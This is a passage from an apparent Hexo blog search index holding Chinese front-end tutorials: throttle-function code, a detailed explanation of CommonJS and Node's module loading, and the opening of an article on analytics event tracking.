&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>若delay=1000，则在1s内只会执行一次回调函数。</p>
<h2 id="节流函数的实现-第一次触发立即执行，最后一次触发也会执行"><a href="#节流函数的实现-第一次触发立即执行，最后一次触发也会执行" class="headerlink" title="节流函数的实现(第一次触发立即执行，最后一次触发也会执行)"></a>节流函数的实现(第一次触发立即执行，最后一次触发也会执行)</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> throttleExecMore = <span class="function"><span class="keyword">function</span>(<span class="params">cb, delay</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> timer = <span class="literal">null</span>; </span><br><span class="line">  <span class="keyword">let</span> startTime = <span class="built_in">Date</span>.now();</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">...args</span>) </span>&#123;        </span><br><span class="line">    <span class="keyword">const</span> curTime = <span class="built_in">Date</span>.now(); </span><br><span class="line">    <span class="keyword">const</span> remaining = delay - (curTime - startTime); </span><br><span class="line">    <span class="keyword">const</span> context = <span class="keyword">this</span>;           </span><br><span class="line">    timer &amp;&amp; clearTimeout(timer);</span><br><span class="line">    <span class="keyword">if</span> (remaining &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="comment">// 第一次触发执行               </span></span><br><span class="line">      cb.apply(context, args);              </span><br><span class="line">      startTime = <span class="built_in">Date</span>.now();         </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// 最后一次触发也会执行             </span></span><br><span class="line">      timer = setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        cb.apply(context, args);</span><br><span class="line">        timer = <span class="literal">null</span>;</span><br><span class="line">      &#125;, remaining);          </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第一次触发会立即执行回调函数，最后一次触发也会执行一次回调函数。</p>
<h1 id="应用场景举例"><a href="#应用场景举例" class="headerlink" title="应用场景举例"></a>应用场景举例</h1><h2 id="防抖"><a href="#防抖" class="headerlink" title="防抖"></a>防抖</h2><ol>
<li>搜索联想，在不断输入值时节约请求资源。</li>
<li>窗口resize事件</li>
</ol>
<h2 id="节流"><a href="#节流" class="headerlink" title="节流"></a>节流</h2><ol>
<li>鼠标不断点击，单位时间内只触发一次</li>
<li>滚动到底部加载更多</li>
</ol>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>防抖和节流</tag>
      </tags>
  </entry>
  <entry>
    <title>koa教程</title>
    <url>/2019/10/27/koa%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>CommonJS规范</title>
    <url>/2019/11/08/CommonJS%E8%A7%84%E8%8C%83/</url>
    <content><![CDATA[<h1 id="CommonJS规范"><a href="#CommonJS规范" class="headerlink" title="CommonJS规范"></a>CommonJS规范</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CommonJS规范的提出，使得javascript具备开发大型应用的基础能力，规范制定者希望用CommonJS API写出的应用可以具备跨宿主环境的能力，能够在任何地方运行。这样javascript不仅可以用开发富客户端应用，而且还可以编写：</p>
<ol>
<li>服务器端javascript应用程序</li>
<li>命令行工具</li>
<li>桌面图形界面应用程序。</li>
<li>混合应用。</li>
</ol>
<p>目前，该规范依旧在成长。它涵盖了模块、二进制、Buffer、字符集编码、I/O流、进程环境、文件系统、套接字、单元测试、web服务器网关接口、包管理等。<br>node借鉴CommonJS的Modules规范实现了一套非常易用的模块系统，NPM对Packages规范的完好支持使得Node应用在开发中事半功倍。<br><a id="more"></a></p>
<h2 id="CommonJS的模块规范"><a href="#CommonJS的模块规范" class="headerlink" title="CommonJS的模块规范"></a>CommonJS的模块规范</h2><p>CommonJS对模块的定义十分简单，主要分为模块引用、模块定义和模块标识3个部分。</p>
<p>1.模块引用</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> math = <span class="built_in">require</span>(<span class="string">'math'</span>);</span><br></pre></td></tr></table></figure>
<p>require这个方法接受模块标识，以此引入一个模块的API到当前上下文中。</p>
<p>2.模块定义</p>
<p>对应引入的功能，上下文提供了exports对象用于导出当前模块的方法或者变量，并且它是唯一导出的出口。module对象代表模块自身，而exports是module的属性。在node中，一个文件就是一个模块，将方法挂载在exports对象上作为属性即可定义导出的方式:<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// math.js</span></span><br><span class="line">exports.add = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> sum = <span class="number">0</span>,</span><br><span class="line">      i   = <span class="number">0</span>,</span><br><span class="line">      args = <span class="built_in">arguments</span>,</span><br><span class="line">      l = args.length;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">while</span> (i &lt; l) &#123;</span><br><span class="line">    sum += args[i++];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> sum;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// program.js</span></span><br><span class="line"><span class="keyword">var</span> math = <span class="built_in">require</span>(<span class="string">'./math'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(math.add(<span class="number">1</span>, <span class="number">2</span>));<span class="comment">// 3</span></span><br></pre></td></tr></table></figure></p>
<p>3.模块标识</p>
<p>模块标识其实就是传递给require()方法的参数，它必须是符合小驼峰命名的字符串，或者以.、..开头的相对路径，或者绝对路径。可以没有文件名后缀.js。</p>
<p>模块的意义在于将类聚的方法和变量等限定在私有的作用域中，同时支持引入和导出功能以顺畅地连接上下游依赖。</p>
<h2 id="node的模块实现"><a href="#node的模块实现" class="headerlink" title="node的模块实现"></a>node的模块实现</h2><p>Node在实现中并非完全按照规范实现。</p>
<p>在node中引入模块，需要经历3个步骤。</p>
<ol>
<li>路径分析</li>
<li>文件定位</li>
<li>编译执行</li>
</ol>
<p>在node中，模块分为两类:一类是node提供的模块，称为核心模块；另一类是用户编写的模块，称为文件模块。</p>
<ol>
<li>核心模块部分在node源代码的编译过程中，编译进了二进制执行文件。在node进程启动时，部分核心模块就被直接加载进内存中，所以这部分核心模块引入时，文件定位和编译执行这两个步骤可以省略掉，并且在路径分析中优先判断，所以它的加载速度是最快的。</li>
<li>文件模块则是在运行时动态加载，需要完整的路径分析、文件定位、编译执行过程，速度比核心模块慢。</li>
</ol>
<p>接下来，我们展开详细的模块加载过程。</p>
<p>1.优先从缓存加载</p>
<p>node对引入过的模块都会进行缓存，以减少二次引入时的开销。与浏览器仅仅缓存文件不同，node缓存的是编译和执行之后的对象。</p>
<p>无论是核心模块还是文件模块，require()方法对相同模块的二次加载都一律采用缓存优先的方式，这是第一优先级的，核心模块的缓存检查先于文件模块的缓存检查。</p>
<p>2.路径分析和文件定位</p>
<p>2.1模块标识符分析</p>
<p>require()方法接受一个标识符作为参数，node正是基于这样一个标识符进行模块查找的。模块标识符在node中主要分为几类。</p>
<ol>
<li>核心模块，如http、fs、path等</li>
<li>以.或..开始的相对路径文件模块</li>
<li>以/开始的绝对路径文件模块</li>
<li><p>非路径形式的文件模块，如自定义的connect模块</p>
</li>
<li><p>核心模块<br>核心模块的优先级仅次于缓存加载，它在node的源代码编译过程中已经编译为二进制文件代码，其加载过程最快。</p>
</li>
<li><p>路径形式的文件模块<br>以.、..和/开始的标识符，这里都被当做文件模块来处理。在分析路径模块时，require()方法会将路径转为真实路径，并以真实路径作为索引，将编译执行后的结果存放到缓存中，以使二次加载时更快。由于文件模块给node指明了确切的文件位置，所以在查找过程中可以节约大量时间，其加载速度慢于核心模块。</p>
</li>
<li><p>自定义模块<br>自定义模块指的是非核心模块，也不是路径形式的标识符。它是一种特殊的文件模块，可能是一个文件或者包的形式。这类模块的查找是最费时的，也是所有方式中最慢的一种。</p>
</li>
</ol>
<p>我们需要先介绍一下模块路径这个概念。模块路径是node在定位文件模块的具体文件时制定的查找策略，具体表现为一个路径组成的数组。关于这个路径的生成规则，我们可以手动尝试一番。</p>
<p>(1)创建module_path.js文件，其内容为console.log(module.paths);<br>(2)将其放在任意一个目录中然后执行node module_path.js</p>
<p>在Linux下，你可能得到的是这样一个数组输出:<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">[<span class="string">'/home/jackson/research/node_modules'</span>,</span><br><span class="line"><span class="string">'/home/jackson/node_modules'</span>,</span><br><span class="line"><span class="string">'/home/node_modules'</span>,</span><br><span class="line"><span class="string">'/node_modules'</span>]</span><br></pre></td></tr></table></figure></p>
<p>在window下，也许是这样：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">[<span class="string">'c:\\nodejs\\node_modules'</span>, <span class="string">'c:\\node_modules'</span>]</span><br></pre></td></tr></table></figure></p>
<p>可以看出，模块路径的生成规则如下所示。<br>1.当前文件目录下的node_modules目录<br>2.父目录下的node_modules目录<br>3.父目录的父目录下的node_modules目录<br>4.沿路径向上逐级递归，直到根目录下的node_modules目录<br>在加载过程中，node会逐个尝试模块路径中的路径，直到找到目标文件为止。当前文件路径越深，模块查找耗时越多，这是自定义模块的加载速度最慢的原因。</p>
<p>2.1文件定位</p>
<p>从缓存加载的优化策略使得二次引入时不需要路径分析、文件定位和编译执行的过程，大大提高了再次加载模块的效率。</p>
<p>但在文件定位过程中，还有一些细节需要注意，这主要包括文件拓展名的分析、目录和包的处理。<br>2.1.1文件扩展名分析<br>CommonJS模块规范允许在标识符中不包含文件扩展名，这种情况下node会按.js、.json、.node的次序补足扩展名，依次尝试。在尝试过程中，需要调用fs模块同步阻塞式判断文件是否存在。因为node是单线程，这里是一个会引起性能问题的地方。小诀窍是：标识符带上扩展名，这样会加快一点速度。另一个诀窍是：同步配合缓存，也可以大幅度缓解Node单线程阻塞式调用的缺陷。</p>
<p>2.1.2目录分析和包</p>
<p>在分析标识符的过程中，require()通过分析拓展名之后，可能没有查找到对应文件，但却得到一个目录，此时Node会将目录当做一个包来处理。</p>
<p>Node会在当前目录下查找package.json（包描述文件），通过JSON.parse()解析包描述对象，从中取出main属性指定的文件名进行定位。如果文件名缺少扩展名，将会进入扩展名分析的步骤。而如果main属性指定的文件名错误，或者压根没有package.json文件，node会将index当做默认文件名，然后依次查找index.js、index.json、index.node。</p>
<p>如果没有定位成功，则自定义模块进入下一个模块路径进行查找。如果模块路径数组都被遍历完毕，依旧没有查找到，则会抛出查找失败的异常。</p>
<h2 id="模块编译"><a href="#模块编译" class="headerlink" title="模块编译"></a>模块编译</h2><p>在Node中，每个文件模块都是一个对象,它的定义如下<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Module</span>(<span class="params">id, parent</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.id = id; <span class="comment">// 模块的识别符，通常是带有绝对路径的模块文件名。</span></span><br><span class="line">  <span class="keyword">this</span>.exports = &#123;&#125;; <span class="comment">// 表示模块对外输出的值。</span></span><br><span class="line">  <span class="keyword">this</span>.parent = parent; <span class="comment">// 返回一个对象，表示调用该模块的模块。可以判断parent是否为null判断当前模块是否为入口脚本。</span></span><br><span class="line">  <span class="keyword">if</span> (parent &amp;&amp; parent.children) &#123;</span><br><span class="line">    parent.children.push(<span class="keyword">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">this</span>.filename = <span class="literal">null</span>; <span class="comment">// 模块的文件名，带有绝对路径。</span></span><br><span class="line">  <span class="keyword">this</span>.loaded = <span class="literal">false</span>; <span class="comment">// 返回一个布尔值，表示模块是否已经完成加载。</span></span><br><span class="line">  <span class="keyword">this</span>.children = []; <span class="comment">// 返回一个数组，表示该模块要用到的其他模块。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>定位到具体的文件后，Node会新建一个模块对象，然后根据路径载入并编译。对于不同的文件扩展名，其载入方法也有所不同。</p>
<ol>
<li>.js文件 通过fs模块同步读取文件后编译执行</li>
<li>.node文件 这是C/C++编写的扩展文件，通过dlopen()方法加载最后编译生成的文件</li>
<li>.json文件 通过fs模块同步读取文件后，用JSON.parse()解析返回结果</li>
<li>其余扩展名文件 都被当做.js文件载入<br>每一个编译成功的模块都会将其文件路径作为索引缓存在Module._cache对象上，以提高二次引入的性能<br>.json文件的调用如下：<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Native extension for .json</span></span><br><span class="line">Module._extensions[<span class="string">'.json'</span>] = <span class="function"><span class="keyword">function</span>(<span class="params">module, filename</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> content = NativeModule.require(<span class="string">'fs'</span>).readFileSync(filename, <span class="string">'utf8'</span>);</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="built_in">module</span>.exports = <span class="built_in">JSON</span>.parse(stripBOM(content));</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    err.message = filename + <span class="string">':'</span> + err.message;</span><br><span class="line">    <span class="keyword">throw</span> err;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>其中，Module._extensions会被赋值给require()的extensions属性，所以访问require.extensions可以知道系统中已有的扩展加载方式：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">require</span>.extensions);</span><br></pre></td></tr></table></figure></p>
<p>结果如下：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="built_in">Object</span>: <span class="literal">null</span> prototype] &#123; <span class="string">'.js'</span>: [<span class="built_in">Function</span>], <span class="string">'.json'</span>: [<span class="built_in">Function</span>], <span class="string">'.node'</span>: [<span class="built_in">Function</span>] &#125;</span><br></pre></td></tr></table></figure></p>
<p>如果想对自定义的扩展名进行特殊的加载，可以通过类似require.extensions[‘.ext’]的方式实现。早期的CoffeeScript文件就是通过添加require.extensions[‘.coffee’]扩展的方式来实现加载的。但是从V0.10.6开始，官方不鼓励通过这种方式进行加载，而是期望先将其他语言或文件编译成JavaScript文件后再加载，这样做的好处在于不将烦琐的编译加载等过程引入Node的执行过程中。</p>
<p>在确定文件的扩展名之后，Node将调用具体的编译方式来将文件执行后返回给调用者。<br>1.javaScript模块的编译<br>每个模块文件都有exports、require、、module、<strong>filename、</strong>dirname这些变量存在<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">'0'</span>: &#123;&#125;,</span><br><span class="line">  <span class="string">'1'</span>:</span><br><span class="line">   &#123; [<span class="built_in">Function</span>: <span class="built_in">require</span>]</span><br><span class="line">     resolve: &#123; [<span class="built_in">Function</span>: resolve] paths: [<span class="built_in">Function</span>: paths] &#125;,</span><br><span class="line">     main:</span><br><span class="line">      Module &#123;</span><br><span class="line">        id: <span class="string">'.'</span>,</span><br><span class="line">        exports: &#123;&#125;,</span><br><span class="line">        parent: <span class="literal">null</span>,</span><br><span class="line">        filename: <span class="string">'/Users/xxx/Desktop/study/node-test/module_path.js'</span>,</span><br><span class="line">        loaded: <span class="literal">false</span>,</span><br><span class="line">        children: [],</span><br><span class="line">        paths: [<span class="built_in">Array</span>] &#125;,</span><br><span class="line">     extensions:</span><br><span class="line">      [<span class="built_in">Object</span>: <span class="literal">null</span> prototype] &#123; <span class="string">'.js'</span>: [<span class="built_in">Function</span>], <span class="string">'.json'</span>: [<span class="built_in">Function</span>], <span class="string">'.node'</span>: [<span class="built_in">Function</span>] &#125;,</span><br><span class="line">     cache:</span><br><span class="line">      [<span class="built_in">Object</span>: <span class="literal">null</span> prototype] &#123;</span><br><span class="line">        <span class="string">'/Users/xxx/Desktop/study/node-test/module_path.js'</span>: [Module] &#125; &#125;,</span><br><span class="line">  <span class="string">'2'</span>:</span><br><span class="line">   Module &#123;</span><br><span class="line">     id: <span class="string">'.'</span>,</span><br><span class="line">     exports: &#123;&#125;,</span><br><span class="line">     parent: <span class="literal">null</span>,</span><br><span class="line">     filename: <span class="string">'/Users/xxx/Desktop/study/node-test/module_path.js'</span>,</span><br><span class="line">     loaded: <span class="literal">false</span>,</span><br><span class="line">     children: [],</span><br><span class="line">     paths:</span><br><span class="line">      [ <span class="string">'/Users/xxx/Desktop/study/node-test/node_modules'</span>,</span><br><span class="line">        <span class="string">'/Users/xxx/Desktop/study/node_modules'</span>,</span><br><span class="line">        <span class="string">'/Users/xxx/Desktop/node_modules'</span>,</span><br><span class="line">        <span class="string">'/Users/xxx/node_modules'</span>,</span><br><span class="line">        <span class="string">'/Users/node_modules'</span>,</span><br><span class="line">        <span class="string">'/node_modules'</span> ] &#125;,</span><br><span class="line">  <span class="string">'3'</span>: <span class="string">'/Users/xxx/Desktop/study/node-test/module_path.js'</span>,</span><br><span class="line">  <span class="string">'4'</span>: <span class="string">'/Users/xxx/Desktop/study/node-test'</span> &#125;</span><br></pre></td></tr></table></figure></p>
<p>在编译的过程中，Node对获取的JavaScript文件内容进行了头尾包装。在头部添加了:<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">exports, require, module, __filename, __dirname</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> content = <span class="string">"content"</span>;</span><br><span class="line">  exports.content = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(content);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<p>这样每个模块文件之前都进行了作用域隔离。包装之后的代码会通过vm原生模块的runInThisContext()方法执行(类似eval，只是具有明确上下文，不污染全局)，返回一个具体的function对象。最后，将当前模块对象的exports属性、require方法、module（模块对象自身），以及在文件定位中得到的完整文件路径和文件目录作为参数传递给这个function()执行.</p>
<p>在执行之后，模块的exports属性被返回给了调用方。exports属性上的任何方法和属性都可以被外部调用到。但模块中的其余变量或属性则不可直接被调用。</p>
<p>那么存在exports的情况下，为何存在module.exports。理想情况下，只要赋值给exports即可<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">exports = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// My Class</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>但是会得到一个失败的结果。</p>
<p>CommonJS规范规定，每个模块内部，module变量代表当前模块。这个变量是一个对象，它的exports属性（即module.exports）表示当前模块对外输出的接口。其他文件加载该模块，实际上就是读取module.exports变量。</p>
<p>为了方便，Node为每个模块提供一个exports变量，指向module.exports。<br>如果要达到require引入一个类的效果，赋值给exports会切断exports与module.exports的联系，请赋值给module.exports对象。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// a.js</span></span><br><span class="line"><span class="comment">// exports = function () &#123;&#125;;</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// b.js</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="built_in">require</span>(<span class="string">'./a.js'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(a);<span class="comment">// [Function]</span></span><br></pre></td></tr></table></figure>
<h2 id="AMD规范与CommonJS规范的兼容性"><a href="#AMD规范与CommonJS规范的兼容性" class="headerlink" title="AMD规范与CommonJS规范的兼容性"></a>AMD规范与CommonJS规范的兼容性</h2><p>CommonJS规范加载模块是同步的，也就是说，只有加载完成，才能执行后面的操作。AMD规范则是非同步加载模块，允许指定回调函数。由于Node.js主要用于服务器编程，模块文件一般都已经存在于本地硬盘，所以加载起来比较快，不用考虑非同步加载的方式，所以CommonJS规范比较适用。但是，如果是浏览器环境，要从服务器端加载模块，这时就必须采用非同步模式，因此浏览器端一般采用AMD规范。</p>
<p>AMD规范使用define方法定义模块<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">define([<span class="string">'package/lib'</span>], <span class="function"><span class="keyword">function</span>(<span class="params">lib</span>)</span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    lib.log(<span class="string">'hello world!'</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    foo: foo</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>AMD规范允许输出的模块兼容CommonJS规范，这时define方法需要写成下面这样：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">define(<span class="function"><span class="keyword">function</span> (<span class="params">require, exports, module</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> someModule = <span class="built_in">require</span>(<span class="string">"someModule"</span>);</span><br><span class="line">  <span class="keyword">var</span> anotherModule = <span class="built_in">require</span>(<span class="string">"anotherModule"</span>);</span><br><span class="line"></span><br><span class="line">  someModule.doTehAwesome();</span><br><span class="line">  anotherModule.doMoarAwesome();</span><br><span class="line"></span><br><span class="line">  exports.asplode = <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">    someModule.doTehAwesome();</span><br><span class="line">    anotherModule.doMoarAwesome();</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<h2 id="模块的循环加载"><a href="#模块的循环加载" class="headerlink" title="模块的循环加载"></a>模块的循环加载</h2><p>如果发生模块的循环加载，即A加载B，B又加载A，则B将加载A的不完整版本。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// a.js</span></span><br><span class="line">exports.x = <span class="string">'a1'</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'a.js '</span>, <span class="built_in">require</span>(<span class="string">'./b.js'</span>).x);</span><br><span class="line">exports.x = <span class="string">'a2'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// b.js</span></span><br><span class="line">exports.x = <span class="string">'b1'</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'b.js '</span>, <span class="built_in">require</span>(<span class="string">'./a.js'</span>).x);</span><br><span class="line">exports.x = <span class="string">'b2'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// main.js</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'main.js '</span>, <span class="built_in">require</span>(<span class="string">'./a.js'</span>).x);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'main.js '</span>, <span class="built_in">require</span>(<span class="string">'./b.js'</span>).x);</span><br></pre></td></tr></table></figure></p>
<p>上面代码是三个JavaScript文件。其中，a.js加载了b.js，而b.js又加载a.js。这时，Node返回a.js的不完整版本，所以执行结果如下。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ node main.js       </span><br><span class="line">b.js  a1</span><br><span class="line">a.js  b2</span><br><span class="line">main.js  a2</span><br><span class="line">main.js  b2 // 取的缓存</span><br></pre></td></tr></table></figure></p>
<h2 id="require-main"><a href="#require-main" class="headerlink" title="require.main"></a>require.main</h2><p>require方法有一个main属性，可以用来判断模块是直接执行，还是被调用执行。</p>
<p>直接执行的时候（node module.js），require.main属性指向模块本身。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">require</span>.main === <span class="built_in">module</span></span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure></p>
<p>调用执行的时候（通过require加载该脚本执行），上面的表达式返回false。</p>
<h2 id="模块的加载机制"><a href="#模块的加载机制" class="headerlink" title="模块的加载机制"></a>模块的加载机制</h2><p>CommonJS模块的加载机制是，输入的是被输出的值的拷贝。也就是说，一旦输出一个值，模块内部的变化就影响不到这个值。<br>下面是一个模块文件lib.js。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// lib.js</span></span><br><span class="line"><span class="keyword">var</span> counter = <span class="number">3</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">incCounter</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  counter++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  counter: counter,</span><br><span class="line">  incCounter: incCounter,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>上面代码输出内部变量counter和改写这个变量的内部方法incCounter。<br>加载上面的模块。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main.js</span></span><br><span class="line"><span class="keyword">var</span> counter = <span class="built_in">require</span>(<span class="string">'./lib'</span>).counter;</span><br><span class="line"><span class="keyword">var</span> incCounter = <span class="built_in">require</span>(<span class="string">'./lib'</span>).incCounter;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(counter);  <span class="comment">// 3</span></span><br><span class="line">incCounter();</span><br><span class="line"><span class="built_in">console</span>.log(counter); <span class="comment">// 3</span></span><br></pre></td></tr></table></figure></p>
<p>上面代码说明，counter输出以后，lib.js模块内部的变化就影响不到counter了。</p>
<h2 id="require的内部处理流程"><a href="#require的内部处理流程" class="headerlink" title="require的内部处理流程"></a>require的内部处理流程</h2><p>最后总结一下require。require命令是CommonJS规范之中，用来加载其他模块的命令。它其实不是一个全局命令，而是指向当前模块的module.require命令，而后者又调用Node的内部命令Module._load。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Module._load = <span class="function"><span class="keyword">function</span>(<span class="params">request, parent, isMain</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 1. 检查 Module._cache，是否缓存之中有指定模块</span></span><br><span class="line">  <span class="comment">// 2. 如果缓存之中没有，就创建一个新的Module实例</span></span><br><span class="line">  <span class="comment">// 3. 将它保存到缓存</span></span><br><span class="line">  <span class="comment">// 4. 使用 module.load() 加载指定的模块文件，</span></span><br><span class="line">  <span class="comment">//    读取文件内容之后，使用 module.compile() 执行文件代码</span></span><br><span class="line">  <span class="comment">// 5. 如果加载/解析过程报错，就从缓存删除该模块</span></span><br><span class="line">  <span class="comment">// 6. 返回该模块的 module.exports</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>上面的第4步，采用module.compile()执行指定模块的脚本，逻辑如下。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Module.prototype._compile = <span class="function"><span class="keyword">function</span>(<span class="params">content, filename</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 1. 生成一个require函数，指向module.require</span></span><br><span class="line">  <span class="comment">// 2. 加载其他辅助方法到require</span></span><br><span class="line">  <span class="comment">// 3. 将文件内容放到一个函数之中，该函数可调用 require</span></span><br><span class="line">  <span class="comment">// 4. 执行该函数</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>上面的第1步和第2步，require函数及其辅助方法主要如下。</p>
<ol>
<li>require(): 加载外部模块</li>
<li>require.resolve()：将模块名解析到一个绝对路径</li>
<li>require.main：指向主模块</li>
<li>require.cache：指向所有缓存的模块</li>
<li>require.extensions：根据文件的后缀名，调用不同的执行函数</li>
</ol>
<p>一旦require函数准备完毕，整个所要加载的脚本内容，就被放到一个新的函数之中，这样可以避免污染全局环境。该函数的参数包括require、module、exports，以及其他一些参数。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">exports, require, module, __filename, __dirname</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// YOUR CODE INJECTED HERE!</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>Module._compile方法是同步执行的，所以Module._load要等它执行完成，才会向用户返回module.exports的值。</p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>CommonJS规范</tag>
      </tags>
  </entry>
  <entry>
    <title>埋点</title>
    <url>/2019/11/16/%E5%9F%8B%E7%82%B9/</url>
    <content><![CDATA[<p>关于埋点的系统介绍<br><a id="more"></a></p>
<h2 id="埋点的用途"><a href="#埋点的用途" class="headerlink" title="埋点的用途"></a>埋点的用途</h2><p>通过埋点可以将在使用客户端过程中的各种数据发送到日志文件、消息队列、数仓等存储介质中。技术同学可以基于这些数据进行数据挖掘、数据建模等工作，产出有价值的分析报告。另外，通过研发一些可视化工具，也可以让市场、产品、运营等人员自主、高效地进行业务分析。</p>
<p>埋点一般采集页面曝光、按钮点击、用户的交互行为等各种数据。它可以分析H5活动的效果、广告引流情况、产品新功能使用情况等等。它是基于数据分析业务的有力工具。</p>
<h2 id="前端埋点sdk"><a href="#前端埋点sdk" class="headerlink" title="前端埋点sdk"></a>前端埋点sdk</h2><p>前端埋点sdk一般会监听一些事件实现自动化埋点，同时也会封装一些api，并提供配置入口以供使用者调用，从而提高埋点的效率以及数据的规范性。</p>
<p>根据sdk设计的基础理论需要思考：</p>
<ol>
<li>who：是谁操作，有哪些属性</li>
<li>when：何时触发</li>
<li>where：触发位置</li>
<li>what：具体内容</li>
</ol>
<p>前端埋点sdk一般会采集页面浏览、点击、页面加载性能、JS报错等数据</p>
<h2 id="埋点方案"><a href="#埋点方案" class="headerlink" title="埋点方案"></a>埋点方案</h2><p>埋点一般有5种方案：</p>
<ol>
<li>代码埋点</li>
<li>声明式埋点</li>
<li>可视化埋点</li>
<li>无埋点</li>
<li>后端埋点<h2 id="代码埋点"><a href="#代码埋点" class="headerlink" title="代码埋点"></a>代码埋点</h2>概念：在需要埋点的地方手动写埋点代码。<br>优点：</li>
<li>自定义程度高</li>
<li>可以实现部分其他埋点方式难以实现的功能。</li>
</ol>
<p>缺点：</p>
<ol>
